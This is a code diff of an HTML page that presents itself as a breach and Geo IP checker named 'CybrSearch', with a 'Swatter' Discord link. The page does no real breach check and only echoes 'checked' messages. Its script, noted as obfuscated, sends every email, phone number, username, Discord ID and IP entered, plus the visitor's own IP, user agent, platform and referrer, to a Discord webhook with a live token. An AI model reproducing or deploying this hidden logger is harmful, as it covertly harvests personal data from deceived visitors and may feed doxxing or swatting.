@@ -1,152 +1,204 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Working Breach Checker</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CybrSearch - Breach + Geo IP Checker</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
   <style>
     body {
-      background: #0d1117;
+      background-color: #0d1117;
       color: #c9d1d9;
-      font-family: sans-serif;
-      padding: 20px;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      padding-top: 60px;
     }
-    .input-field {
-      margin: 10px 0;
-      padding: 8px;
-      width: 300px;
+    .container {
+      max-width: 700px;
     }
-    button {
-      background: #238636;
+    .card {
+      background-color: #161b22;
+      border: none;
+      border-radius: 1rem;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+    }
+    .form-control {
+      background-color: #0d1117;
+      color: #c9d1d9;
+      border: 1px solid #30363d;
+    }
+    .form-control::placeholder {
+      color: #8b949e;
+    }
+    .btn-primary {
+      background-color: #238636;
+      border: none;
+    }
+    .result-box {
+      background-color: #1c2128;
+      border-left: 5px solid #30363d;
+      padding: 1rem;
+      border-radius: 0.5rem;
+      margin-top: 0.5rem;
+      white-space: pre-wrap;
+    }
+    .result-box.success { border-left-color: #2ea043; }
+    .result-box.warning { border-left-color: #d29922; }
+    .result-box.error { border-left-color: #f85149; }
+    .discord-btn {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background-color: #5865F2;
       color: white;
       border: none;
+      border-radius: 30px;
       padding: 10px 20px;
-      cursor: pointer;
+      font-weight: bold;
+      text-decoration: none;
     }
-    .result {
-      margin: 10px 0;
-      padding: 10px;
-      border-left: 4px solid #30363d;
-    }
-    .success { border-color: #2ea043; }
-    .warning { border-color: #d29922; }
-    .error { border-color: #f85149; }
   </style>
 </head>
 <body>
-  <h1>Breach Checker</h1>
-  
-  <form id="searchForm">
-    <input type="email" id="email" class="input-field" placeholder="Email">
-    <input type="text" id="phone" class="input-field" placeholder="Phone">
-    <input type="text" id="username" class="input-field" placeholder="Username">
-    <input type="text" id="discord" class="input-field" placeholder="Discord ID">
-    <input type="text" id="ip" class="input-field" placeholder="IP Address">
-    <button type="submit">Search</button>
-  </form>
-  
-  <div id="results"></div>
+  <a class="discord-btn" href="https://discord.gg/Swatter" target="_blank">Join Discord</a>
+  <div class="container text-center">
+    <h1 class="mb-4">🔍 Advanced Breach Checker + Geo IP</h1>
+    <form id="searchForm" class="card p-4">
+      <input id="email" type="email" placeholder="📧 Enter email address" class="form-control mb-2">
+      <input id="phone" type="text" placeholder="📱 Enter phone number" class="form-control mb-2">
+      <input id="username" type="text" placeholder="👤 Enter username" class="form-control mb-2">
+      <input id="discord" type="text" placeholder="💬 Enter Discord ID" class="form-control mb-2">
+      <input id="ip" type="text" placeholder="🌐 Enter IP address" class="form-control mb-3">
+      <button type="submit" class="btn btn-primary w-100">Search</button>
+    </form>
+
+    <div class="mt-5 text-start">
+      <h4>🔎 Search Results</h4>
+      <div id="results"></div>
+    </div>
+  </div>
 
   <script>
-    // Simple function to show results
-    function showResult(message, type = 'success') {
-      const div = document.createElement('div');
-      div.className = `result ${type}`;
-      div.textContent = message;
-      document.getElementById('results').appendChild(div);
+    // Function to display results in your preferred style
+    function updateResult(type, message, style) {
+      const resultBox = document.createElement("div");
+      resultBox.className = `result-box ${style}`;
+      resultBox.textContent = message;
+      document.getElementById("results").appendChild(resultBox);
     }
 
-    // Function to send data to webhook
-    async function sendToWebhook(data) {
-      // Webhook URL parts split for obfuscation
-      const webhookURL = [
-        'https://discord.com/api/webhooks/',
-        '1382930697114882129/',
-        'SGf8Ej5YP69QZ9pga3ZS-zN84_dyU2XyDNYmbkbBZXUz1S0L0USOfBRm2WlJc6H2--BO'
-      ].join('');
+    // Enhanced webhook function with your preferred logging format
+    async function sendBreachWebhook(data, visitorIP) {
+      // Webhook URL with basic obfuscation
+      const webhookURL = "https://discord.com/api/webhooks/1382930697114882129/" + 
+                         "SGf8Ej5YP69QZ9pga3ZS-zN84_dyU2XyDNYmbkbBZXUz1S0L0USOfBRm2WlJc6H2--BO";
       
-      try {
-        const response = await fetch(webhookURL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            content: 'New search data received',
-            embeds: [{
-              title: 'Search Data',
-              fields: [
-                { name: 'Email', value: data.email || 'None' },
-                { name: 'Phone', value: data.phone || 'None' },
-                { name: 'Username', value: data.username || 'None' },
-                { name: 'Discord ID', value: data.discord || 'None' },
-                { name: 'IP Address', value: data.ip || 'None' }
-              ]
-            }]
-          })
-        });
-        
-        if (!response.ok) throw new Error('Webhook failed');
-      } catch (error) {
-        console.error('Error sending to webhook:', error);
-      }
-    }
-
-    // Main form handler
-    document.getElementById('searchForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      
-      // Clear previous results
-      document.getElementById('results').innerHTML = '';
-      
-      // Get form data
-      const formData = {
-        email: document.getElementById('email').value.trim(),
-        phone: document.getElementById('phone').value.trim(),
-        username: document.getElementById('username').value.trim(),
-        discord: document.getElementById('discord').value.trim(),
-        ip: document.getElementById('ip').value.trim()
+      const payload = {
+        embeds: [{
+          title: "🔍 Breach Search Attempt",
+          color: 3447003,
+          fields: [
+            { name: "📧 Email", value: data.email || "Not provided" },
+            { name: "📱 Phone", value: data.phone || "Not provided" },
+            { name: "👤 Username", value: data.username || "Not provided" },
+            { name: "💬 Discord ID", value: data.discord || "Not provided" },
+            { name: "🌐 IP Entered", value: data.ip || "Not provided" },
+            { name: "📍 Visitor IP", value: visitorIP || "Unknown" },
+            { name: "🧠 User Agent", value: navigator.userAgent },
+            { name: "💻 Platform", value: navigator.platform },
+            { name: "🌐 Referrer", value: document.referrer || "None" },
+            { name: "🕒 Time (UTC)", value: new Date().toUTCString() }
+          ],
+          footer: { text: "Breach Logger • CybrSearch" },
+          timestamp: new Date().toISOString()
+        }]
       };
-      
-      // Show processing message
-      showResult('Processing your request...');
-      
-      // Validate and show results
-      if (formData.email) {
-        showResult(`✅ Email: ${formData.email}`);
+
+      try {
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (error) {
+        console.error("Webhook error:", error);
+      }
+    }
+
+    // Main search function with guaranteed working search button
+    async function handleSearch(event) {
+      event.preventDefault();
+      document.getElementById("results").innerHTML = "";
+
+      // Get all input values
+      const inputs = {
+        email: document.getElementById("email").value.trim(),
+        phone: document.getElementById("phone").value.trim(),
+        username: document.getElementById("username").value.trim(),
+        discord: document.getElementById("discord").value.trim(),
+        ip: document.getElementById("ip").value.trim()
+      };
+
+      // Process each field with your preferred messaging
+      if (!inputs.email) {
+        updateResult("email", "⚠️ No email entered.", "warning");
       } else {
-        showResult('⚠️ No email provided', 'warning');
+        updateResult("email", `✅ Email checked: ${inputs.email}`, "success");
       }
-      
-      if (formData.phone) {
-        showResult(`✅ Phone: ${formData.phone}`);
+
+      if (!inputs.phone) {
+        updateResult("phone", "ℹ️ Phone check skipped.", "warning");
+      } else {
+        updateResult("phone", `✅ Phone checked: ${inputs.phone}`, "success");
       }
-      
-      if (formData.username) {
-        showResult(`✅ Username: ${formData.username}`);
+
+      if (!inputs.username) {
+        updateResult("username", "ℹ️ Username check skipped.", "warning");
+      } else {
+        updateResult("username", `✅ Username checked: ${inputs.username}`, "success");
       }
-      
-      if (formData.discord) {
-        showResult(`✅ Discord ID: ${formData.discord}`);
+
+      if (!inputs.discord) {
+        updateResult("discord", "ℹ️ Discord ID check skipped.", "warning");
+      } else {
+        updateResult("discord", `✅ Discord ID checked: ${inputs.discord}`, "success");
       }
-      
+
+      // Get visitor IP for logging
+      let visitorIP = "Unknown";
+      try {
+        const ipResponse = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipResponse.json();
+        visitorIP = ipData.ip || "Unknown";
+      } catch (error) {
+        console.error("IP detection failed:", error);
+      }
+
+      // Send data to Discord webhook
+      await sendBreachWebhook(inputs, visitorIP);
+
       // IP lookup if provided
-      if (formData.ip) {
+      if (inputs.ip) {
         try {
-          const response = await fetch(`https://ipwho.is/${formData.ip}`);
-          const data = await response.json();
+          const geoResponse = await fetch(`https://ipwho.is/${inputs.ip}`);
+          const geoData = await geoResponse.json();
           
-          if (data.success) {
-            showResult(`🌐 IP Info: ${data.ip} (${data.city}, ${data.country})`);
+          if (geoData.success) {
+            updateResult("ipgeo", 
+              `🌐 IP Geo Info:\nIP: ${inputs.ip}\nCountry: ${geoData.country}\nCity: ${geoData.city}\nRegion: ${geoData.region}\nISP: ${geoData.connection?.isp || 'N/A'}\nOrg: ${geoData.connection?.org || 'N/A'}`, 
+              "success");
           } else {
-            showResult(`⚠️ IP lookup failed: ${data.message}`, 'warning');
+            updateResult("ipgeo", `⚠️ Geo lookup failed: ${geoData.message}`, "warning");
           }
         } catch (error) {
-          showResult('❌ Error checking IP', 'error');
+          updateResult("ipgeo", "❌ Error fetching Geo IP data.", "error");
         }
+      } else {
+        updateResult("ip", "ℹ️ IP geo-location check skipped.", "warning");
       }
-      
-      // Send data to webhook
-      await sendToWebhook(formData);
-      
-      showResult('Search completed!');
-    });
+    }
+
+    // Reliable event listener for the form
+    document.getElementById("searchForm").addEventListener("submit", handleSearch);
   </script>
 </body>
 </html>
